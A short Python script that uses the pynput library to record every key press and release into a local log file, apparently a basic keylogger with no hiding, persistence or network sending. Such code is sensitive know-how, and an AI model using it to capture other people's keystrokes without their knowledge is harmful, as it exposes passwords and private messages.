from pynput import keyboard

# File path to save the keystrokes log
log_file = "keystrokes.log"

# Function to write the pressed key to a log file
def on_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, 'a') as f:
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Function to write the released key to a log file
def on_release(key):
    try:
        # Open the log file in append mode
        with open(log_file, 'a') as f:
            f.write(f"{key} released\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Collect events until stopped
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
